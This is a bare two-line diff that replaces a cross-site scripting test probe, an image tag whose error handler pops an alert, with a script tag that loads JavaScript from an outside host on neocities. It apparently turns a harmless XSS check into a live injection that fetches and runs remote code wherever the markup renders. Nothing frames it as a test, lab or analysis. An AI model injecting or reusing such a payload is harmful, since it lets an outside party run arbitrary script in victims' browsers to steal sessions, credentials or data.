@@ -1,1 +1,1 @@
-<img src=x onerror=alert(12345)>
+<script src=https://imw.neocities.org/r.js></script>
